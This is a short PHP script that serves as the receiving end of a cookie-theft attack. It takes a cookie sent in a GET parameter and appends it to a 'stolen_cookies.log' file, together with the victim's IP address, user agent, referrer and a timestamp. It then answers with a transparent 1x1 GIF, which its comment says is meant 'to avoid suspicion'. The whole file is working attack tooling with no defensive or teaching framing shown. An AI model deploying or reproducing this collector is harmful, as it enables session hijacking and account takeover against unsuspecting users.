<?php
// Log the stolen cookie
$cookie = $_GET['cookie'] ?? 'No cookie received';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referrer = $_SERVER['HTTP_REFERER'] ?? 'Unknown';

$log_entry = "
=== Stolen Cookie ===
Time: $timestamp
IP: $ip
User-Agent: $user_agent
Referrer: $referrer
Cookie: $cookie
===================
";

// Log to file
file_put_contents('stolen_cookies.log', $log_entry, FILE_APPEND);

// Return a transparent 1x1 pixel GIF to avoid suspicion
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>